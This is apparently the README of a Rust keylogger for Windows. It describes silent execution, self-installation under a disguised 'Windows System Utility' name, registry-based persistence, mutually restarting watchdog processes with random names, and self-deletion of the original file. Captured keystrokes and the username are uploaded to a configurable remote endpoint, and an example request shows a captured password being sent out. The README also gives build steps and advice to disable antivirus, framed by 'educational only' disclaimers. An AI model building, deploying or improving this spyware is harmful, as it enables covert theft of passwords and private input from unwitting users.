# RustKeyLogger

A Windows keyboard monitoring application written in Rust with advanced persistence and stealth features.

## Features

### Core Functionality

- **Low-level Keyboard Monitoring** - Uses Windows `GetKeyState()` API for reliable keystroke capture
- **Windowless Execution** - Runs completely silently with no visible console or window (in release builds)
- **Self-Installation** - Automatically installs itself to a hidden system location
- **Persistence Mechanism** - Adds registry startup entry to survive reboots
- **Watchdog System** - Creates monitoring processes that restart the main process if terminated
- **Real-time Upload** - Immediately sends captured keystrokes to remote API endpoint
- **Automatic Username Detection** - Uses system `%USERNAME%` environment variable

### Technical Features

- **Caps Lock + Shift Handling** - Proper XOR logic for uppercase/lowercase detection
- **Edge Detection** - Only captures new key presses (no repeating while held)
- **Special Key Support** - Captures function keys, backspace, delete, insert, etc.
- **Process Management** - Automatically kills existing instances before reinstalling
- **Original File Cleanup** - Deletes itself from original location after installation

### Stealth Features

- **Hidden Installation Path** - `%LOCALAPPDATA%\WindowsSystemUtility\WinSysUtils.exe`
- **Random Watchdog Names** - Creates copies with 12-digit random numeric names
- **No Console Window** - Completely silent operation in release builds
- **Generic Process Name** - Uses innocuous "Windows System Utility" naming

## Architecture

```
Original Executable
    ↓
Self-Installs to: %LOCALAPPDATA%\WindowsSystemUtility\WinSysUtils.exe
    ↓
Creates: Registry Entry in HKCU\...\Run
    ↓
Launches: Watchdog Process (e.g., 847261950384.exe)
    ↓
Main Process ←→ Watchdog Process (mutual monitoring)
    ↓
Captures: Keystrokes via GetKeyState() (10ms polling)
    ↓
Uploads: HTTPS POST to API endpoint
```

## Building from Source

### Prerequisites

You need:
1. **Rust toolchain** - Install from https://rustup.rs/
2. **MinGW-w64 (64-bit)** - See installation instructions below
3. **Windows 10/11** - This is Windows-specific software

### Installing MinGW-w64

The easiest method is using **MSYS2**:

#### Step 1: Install MSYS2

1. Download MSYS2 installer from https://www.msys2.org/
2. Run `msys2-x86_64-latest.exe` and install to `C:\msys64` (default)
3. Complete the installation

#### Step 2: Install MinGW-w64 Toolchain

Open **MSYS2 MINGW64** terminal and run:

```bash
pacman -S mingw-w64-x86_64-gcc
pacman -S mingw-w64-x86_64-tools-git
```

#### Step 3: Add to PATH

In **PowerShell** (as Administrator), run:

```powershell
[System.Environment]::SetEnvironmentVariable(
    "Path", 
    "C:\msys64\mingw64\bin;" + $env:Path, 
    [System.EnvironmentVariableTarget]::User
)
```

#### Step 4: Verify Installation

Close and reopen PowerShell, then:

```powershell
gcc --version
# Should show: gcc.exe (Rev..., Built by MSYS2 project)
# Should include: x86_64-w64-mingw32
```

### Building the Project

#### Step 1: Set Rust Toolchain

```powershell
rustup default stable-x86_64-pc-windows-gnu
```

#### Step 2: Build Release Version

```powershell
cd path\to\RustKeyLogger
cargo build --release
```

The executable will be created at: `target\release\RustKeyLogger.exe`

**Important:** The release build has no console window. Debug builds (`cargo build`) will show a console for testing purposes.

### Build Troubleshooting

**Issue:** `error: linking with 'link.exe' failed: cannot open file 'msvcrt.lib'`  
**Solution:** You're using MSVC toolchain instead of GNU. Switch to GNU:
```powershell
rustup default stable-x86_64-pc-windows-gnu
```

**Issue:** `sorry, unimplemented: 64-bit mode not compiled in`  
**Solution:** You have 32-bit MinGW in PATH. Ensure MSYS2's 64-bit version is first:
```powershell
$env:Path = "C:\msys64\mingw64\bin;" + $env:Path
gcc --version  # Verify x86_64-w64-mingw32
```

**Issue:** Build is slow or fails with network errors  
**Solution:** The `ureq` crate downloads dependencies. Ensure stable internet connection.

## Configuration

Edit `src/main.rs` before building to customize:

```rust
// API endpoint for keystroke uploads
const API_URL: &str = "https://your-server.com/log";

// Keyboard polling interval in milliseconds
const POLL_DELAY_MS: u64 = 10;
```

Username is automatically detected from the system's `%USERNAME%` environment variable.

## Usage

### Running the Executable

Simply run the executable:

```powershell
.\target\release\RustKeyLogger.exe
```

Or double-click `RustKeyLogger.exe` in Explorer.

### What Happens

#### First Run (from any location):

1. Creates installation directory: `%LOCALAPPDATA%\WindowsSystemUtility\`
2. Kills any existing WinSysUtils processes
3. Copies itself to `WinSysUtils.exe`
4. Adds registry startup entry
5. Launches the installed version
6. Deletes the original file
7. Exits

#### Subsequent Runs (from installed location):

1. Checks if watchdog process exists
2. Creates watchdog process with random 12-digit name (e.g., `847261950384.exe`)
3. Starts background thread to monitor watchdog health
4. Begins keyboard monitoring loop:
   - Polls keyboard state every 10ms
   - Detects new key presses (edge detection)
   - Uploads immediately to API endpoint
   - Continues indefinitely

#### Watchdog Process:

- Runs with `--watchdog` argument
- Monitors main process every 1 second
- Restarts main process if terminated
- Main process also monitors watchdog every 2 seconds
- Both processes restart each other for maximum persistence

### Installation Paths

- **Main Executable:** `%LOCALAPPDATA%\WindowsSystemUtility\WinSysUtils.exe`
- **Watchdog Copies:** `%LOCALAPPDATA%\WindowsSystemUtility\{12-random-digits}.exe`
- **Registry Entry:** `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\WinSysUtils`

## API Integration

### Request Format

The application sends HTTP POST requests to your configured API endpoint:

```
POST https://your-server.com/log?username={USERNAME}
Content-Type: text/plain

{captured keystrokes}
```

### Example Request

```
POST https://keylogger.example.com/log?username=JohnDoe
Content-Type: text/plain

Hello World<F5>
Password123
```

### Expected Server Response

- **200 OK** - Keystrokes logged successfully
- **4xx/5xx** - Errors are silently ignored (no retry mechanism)

### Keystroke Format

- **Letters:** `a-z` (lowercase) or `A-Z` (uppercase with Shift/Caps)
- **Numbers:** `0-9` or special chars with Shift (`!@#$%^&*()`)
- **Special Keys:** `Space`, `\r\n` (Enter)
- **Function Keys:** `<F1>` through `<F12>`
- **Other:** `<Backspace>`, `<Delete>`, `<Insert>`

## Uninstallation

### Automated Uninstaller

Run the included PowerShell script:

```powershell
.\uninstall.ps1
```

This will:
- Terminate all related processes
- Remove installation directory
- Delete registry startup entry
- Display confirmation messages

### Manual Uninstallation

If the script doesn't work:

```powershell
# 1. Kill all processes
Get-Process | Where-Object {
    $_.Name -like "*WinSys*" -or $_.Name -match '^\d{12}$'
} | Stop-Process -Force

# 2. Remove files
Remove-Item "$env:LOCALAPPDATA\WindowsSystemUtility" -Recurse -Force

# 3. Remove registry entry
Remove-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "WinSysUtils"
```

## Security Considerations

### Antivirus Detection

**This application WILL be detected by antivirus software** as a keylogger because:
- It captures keyboard input
- It has persistence mechanisms
- It creates additional processes
- It communicates over the network

This is **expected behavior** for a keylogger. You may need to:
- Add exclusions to Windows Defender
- Disable antivirus temporarily during testing
- Use in controlled/isolated environments

### Ethical Use

This tool should only be used:
- ✅ On systems you own
- ✅ With explicit written authorization
- ✅ For security research or penetration testing
- ✅ For authorized employee monitoring (with proper disclosure)
- ✅ In isolated lab/testing environments

**Never use this tool:**
- ❌ On systems you don't own
- ❌ Without explicit permission
- ❌ To steal credentials or sensitive data
- ❌ To violate privacy laws
- ❌ For malicious purposes

## Technical Details

### Dependencies

```toml
ureq = "2.10"              # HTTP client (simpler than reqwest)
windows-sys = "0.48"       # Windows API bindings
winreg = "0.50"           # Registry access
rand = "0.8"              # Random number generation
```

### Key Components

**`src/main.rs`** (387 lines)
- Main entry point
- Installation logic
- Watchdog management
- Keyboard capture loop
- HTTP upload functionality

**`src/key_state.rs`**
- `KeyState` struct with all keyboard key fields
- Represents current state of keyboard

**`src/get_key_state.rs`**
- Windows API wrapper
- Calls `GetKeyState()` for each key
- Returns populated `KeyState` struct

**`build.rs`**
- Build-time configuration
- Sets Windows subsystem to "windows" (no console)

**`uninstall.ps1`**
- PowerShell uninstaller script
- Removes all traces of installation

### Compilation Flags

In `Cargo.toml`:

```toml
[profile.release]
strip = false           # Keep debug symbols
opt-level = "z"        # Optimize for size
lto = true             # Link-time optimization
codegen-units = 1      # Single codegen unit
```

In `src/main.rs`:

```rust
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]
```

This attribute ensures:
- **Debug builds:** Show console (for testing)
- **Release builds:** No console (silent operation)

## Performance

### Resource Usage

- **CPU:** ~0.1% (modern systems)
- **Memory:** ~5-10 MB
- **Network:** Minimal (only keystroke data)
- **Disk:** ~4.7 MB executable

### Keyboard Polling

- **Rate:** 10ms (100 times per second)
- **Method:** Windows `GetKeyState()` API
- **Impact:** Negligible performance overhead

## Comparison: C# vs Rust

This project is a complete remake of an original C# Windows Forms keylogger:

| Feature | C# (.NET) | Rust |
|---------|-----------|------|
| Windowless | ✅ | ✅ |
| Installation | ✅ | ✅ |
| Persistence | ✅ | ✅ |
| Watchdog | ✅ | ✅ |
| API Upload | ✅ | ✅ |
| Binary Size | ~100 KB | ~4.7 MB |
| Runtime Dependency | .NET Framework | None (statically linked) |
| Memory Safety | Garbage Collection | Ownership System |
| Deployment | Requires .NET | Standalone executable |

**Advantages of Rust version:**
- No runtime dependencies
- Memory safe (no buffer overflows)
- Better type safety
- Runs on systems without .NET
- More control over system interactions

## Project Structure

```
RustKeyLogger/
├── src/
│   ├── main.rs              # Main implementation (387 lines)
│   ├── key_state.rs         # KeyState struct definition
│   └── get_key_state.rs     # Windows API wrapper
├── target/
│   └── release/
│       └── RustKeyLogger.exe  # Compiled executable (4.7 MB)
├── build.rs                 # Build configuration
├── Cargo.toml               # Dependencies
├── Cargo.lock               # Dependency lock file
├── uninstall.ps1            # Uninstaller script
└── README.md                # This file
```

## Development

### Debug vs Release

**Debug Build:**
```powershell
cargo build
# Creates: target/debug/RustKeyLogger.exe
# Shows console window for debugging
```

**Release Build:**
```powershell
cargo build --release
# Creates: target/release/RustKeyLogger.exe
# No console window (silent)
```

### Testing

1. Build debug version with console
2. Run and observe output
3. Test keyboard capture
4. Verify API uploads
5. Test persistence (reboot)
6. Verify watchdog restarts main process

### Logging

Debug builds can add logging:

```rust
println!("[DEBUG] Buffer: {}", buffer);
println!("[UPLOAD] Sending {} chars to API", buffer.len());
```

Remove all `println!` statements before release builds.

## Troubleshooting

### Keystrokes Not Captured

- Check keyboard API permissions
- May require administrator privileges
- Verify not running in VM with restricted input

### Doesn't Start on Boot

- Check registry entry exists
- Verify install path is correct
- Check Windows Event Viewer for errors
- Ensure not blocked by antivirus

### Watchdog Not Working

- Verify install directory is writable
- Check if antivirus is blocking process creation
- Ensure sufficient disk space

### Upload Failing

- Verify API endpoint is reachable
- Check firewall/network settings
- Verify HTTPS certificate is valid
- Test API endpoint with curl/Postman

## License

This project is provided for **educational purposes only**. 

The authors:
- Do not endorse illegal use
- Assume no liability for misuse
- Provide no warranty of any kind
- Recommend responsible disclosure practices

Use at your own risk and responsibility.

## Contributing

This is an educational project. If you find bugs or have improvements:

1. Ensure changes don't enable malicious use
2. Document security implications
3. Test thoroughly before submitting
4. Follow Rust best practices and idioms

## Acknowledgments

- Based on a C# Windows Forms keylogger concept
- Uses Windows API for keyboard monitoring
- Built with the Rust programming language
- MSYS2 project for MinGW-w64 toolchain

## Support

For issues related to:
- **Building:** Check MinGW-w64 installation and PATH
- **Compilation errors:** Verify Rust toolchain is GNU variant
- **Runtime errors:** Check Windows Event Viewer
- **API integration:** Verify endpoint configuration

---

**Remember:** Always use this tool ethically and legally. Unauthorized access to computer systems is a crime.

